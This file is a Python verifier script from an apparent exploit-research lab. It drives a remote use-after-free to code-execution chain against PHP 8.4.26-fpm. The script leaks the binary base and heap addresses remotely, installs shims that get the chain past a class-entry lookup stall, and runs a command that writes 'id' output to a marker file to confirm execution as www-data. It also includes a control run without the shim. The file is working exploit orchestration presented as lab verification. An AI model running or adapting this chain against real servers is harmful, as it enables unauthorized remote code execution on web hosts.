#!/usr/bin/env python3
"""Verifier for fire_8426_shim.py: proves the UAF->RCE fire lands uid=33 on PHP
8.4.26-fpm when the stock fpm RCE driver is shimmed with fire_8426_shim, through
a reflective (echo) sink. Leaks binbase+chunk remotely, installs the fpm
transport + 8.4.26 fire shims, drives the unchanged run_fpm_chain, and reads the
out-of-band marker that system('id') wrote. --control runs the driver without
the shim to show it stalls at the stdClass class-entry lookup. The remote
binbase is cross-checked against /proc only after the fact. Needs docker access
to the lab container. Lab/analysis use only.

Lab bring-up (isolated echo-sink lab, port 8167 -> nginx -> php-fpm:9000):
    docker compose -f docker-compose.fpm-avenues.yml -p p2s-a7r5 --profile a7r5 up -d --build
    python3 -I poc/chains/verify_fire_8426_shim.py \
        --container p2s-a7r5-fpm --host 127.0.0.1 --port 8167 --runs 5
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import subprocess
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(m)
    return m


if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.labharness import _dx, proc_binbase, worker_alive  # noqa: E402


def _fresh_rce():
    """A fresh fpm_route instance (so a prior run's monkeypatches / req_count
    do not leak between shimmed/control runs)."""
    return _load("fpm_route", "fpm_route.py")


def run_once(host, port, path, cmd, shim84, fc8426, use_shim, tries, attempts,
             seed_binbase=None):
    """One leak->fire attempt. Returns (ok, binbase, chunk, reqs, err).

    If `seed_binbase` is given, binbase is taken from it (a /proc seed -- the
    remote image-pointer leak is an orthogonal, separately-proven primitive,
    mis-calibrated on this WSL2 host) and the chunk is discovered remotely by
    run_fpm_chain's heap_leak.
    This isolates the FIRE + shim, which is exactly the class-entry calibration
    under test. With no seed, binbase is leaked fully remotely (no /proc)."""
    leak_reqs = 0
    if seed_binbase is not None:
        binbase, chunk = seed_binbase, None   # chunk via remote heap_leak
    else:
        binbase, chunk, ld = fc8426.leak_binbase_remote(host, port, path,
                                                         tries=tries, verbose=True)
        leak_reqs = ld.get("leak_reqs") or 0
        if binbase is None:
            return False, None, None, leak_reqs, f"leak failed: {ld.get('error')}"

    rce = _fresh_rce()
    rce.install_fpm_patches(host, port, path, binbase, enum=False)
    token = None
    if use_shim:
        token = shim84.install(rce.remote_rce, binbase, verbose=True)
    if not rce.preflight_reflect(host, port, path):
        return False, binbase, chunk, getattr(rce.remote_rce, "req_count", 0), \
            "sink preflight failed"
    ok, stats = rce.run_fpm_chain(host, port, path, binbase, cmd,
                                  chunk=chunk, attempts=attempts)
    if token is not None:
        token.restore()
    reqs = leak_reqs + (stats.get("total_reqs") or 0)
    return bool(ok), binbase, stats.get("chunk", chunk), reqs, stats.get("error")


def main(argv=None):
    ap = argparse.ArgumentParser()
    ap.add_argument("--container", default="p2s-a7r5-fpm")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8167)
    ap.add_argument("--path", default="/remote_app.php")
    ap.add_argument("--marker", default="/dev/shm/x",
                    help="OOB marker path; 'id>'+marker must be <=14 bytes")
    ap.add_argument("--runs", type=int, default=5)
    ap.add_argument("--tries", type=int, default=12)
    ap.add_argument("--attempts", type=int, default=6)
    ap.add_argument("--control", action="store_true",
                    help="also run run_fpm_chain WITHOUT the shim once, to show "
                         "it stalls at R-5 on 8.4.26 (WALL 2)")
    ap.add_argument("--seed-binbase", action="store_true",
                    help="seed binbase from the container's /proc (isolates the "
                         "FIRE+shim from the orthogonal remote image-ptr leak, "
                         "which is mis-calibrated on this WSL2 host). The chunk "
                         "is still discovered remotely (R-1 heap_leak).")
    args = ap.parse_args(argv)

    shim84 = _load("fire_8426_shim", "fire_8426_shim.py")
    fc8426 = _load("fpm_fullchain_8426", "fpm_fullchain_8426.py")
    print(f"[verify] 8.4.26-fpm echo-sink fire via fire_8426_shim "
          f"(GPF_HANDLER_OFF=0x{shim84.GPF_HANDLER_OFF:x})")
    pbb = proc_binbase(args.container)
    seed = pbb if args.seed_binbase else None
    print(f"[verify] /proc binbase: {hex(pbb) if pbb else 'n/a'} "
          f"({'SEEDED into fire (leak isolated out)' if seed else 'cross-check only, NOT fed in'})")
    marker_cmd = f"id>{args.marker}"

    # Optional control: stock run_fpm_chain WITHOUT the shim -> expect a stall
    # at the stdClass class-entry lookup.
    if args.control:
        print("\n" + "#" * 64 + "\n[verify] CONTROL: run_fpm_chain WITHOUT shim "
              "(expect WALL 2 at R-5)\n" + "#" * 64)
        _dx(args.container, "sh", "-c", f"rm -f {args.marker}")
        ok_c, bb_c, _, _, err_c = run_once(args.host, args.port, args.path,
                                           marker_cmd, shim84, fc8426,
                                           use_shim=False, tries=args.tries,
                                           attempts=args.attempts,
                                           seed_binbase=seed)
        time.sleep(0.4)
        _, out_c = _dx(args.container, "sh", "-c",
                       f"cat {args.marker} 2>/dev/null")
        print(f"[verify] CONTROL: fire={ok_c} marker={out_c.strip()!r} "
              f"err={err_c!r}  (uid in marker => shim NOT needed; empty => "
              f"stock driver cannot fire on 8.4.26)")

    wins = uid_ok = leak_match = req_total = 0
    for run in range(1, args.runs + 1):
        print("\n" + "#" * 64 + f"\n[verify] RUN {run}/{args.runs} (shimmed)\n"
              + "#" * 64)
        _dx(args.container, "sh", "-c", f"rm -f {args.marker}")
        t0 = time.time()
        ok, bb, chunk, reqs, err = run_once(args.host, args.port, args.path,
                                            marker_cmd, shim84, fc8426,
                                            use_shim=True, tries=args.tries,
                                            attempts=args.attempts,
                                            seed_binbase=seed)
        dt = time.time() - t0
        req_total += reqs
        if bb is not None and pbb is not None and bb == pbb:
            leak_match += 1
        time.sleep(0.4)
        _, out = _dx(args.container, "sh", "-c",
                     f"cat {args.marker} 2>/dev/null")
        out = out.strip()
        got_uid = "uid=" in out
        is_wwwdata = ("www-data" in out) or ("uid=33" in out)
        alive = worker_alive(args.container)
        if ok:
            wins += 1
        if got_uid and alive:
            uid_ok += 1
        bbs = f"0x{bb:x}" if bb else "None"
        print(f"[verify] RUN {run}: fire={ok} binbase={bbs} "
              f"binbase==/proc={bb == pbb} reqs={reqs} elapsed={dt:.1f}s "
              f"err={err}")
        print(f"[verify] RUN {run}: marker={out!r} -> uid={got_uid} "
              f"www-data={is_wwwdata} worker_alive={alive}")

    print("\n" + "=" * 64)
    print(f"[verify] SUMMARY over {args.runs} shimmed runs:")
    print(f"  fire delivered       : {wins}/{args.runs}")
    print(f"  marker uid + worker  : {uid_ok}/{args.runs}  "
          f"(the real end-to-end success signal)")
    print(f"  binbase==/proc       : {leak_match}/{args.runs}  "
          f"(remote leak correctness)")
    print(f"  avg requests/run     : {req_total / args.runs:.1f}")
    print(f"  shim = fire_8426_shim.install(rce.a7, binbase); "
          f"stock run_fpm_chain unchanged.")
    return 0 if uid_ok == args.runs else 1


if __name__ == "__main__":
    sys.exit(main())
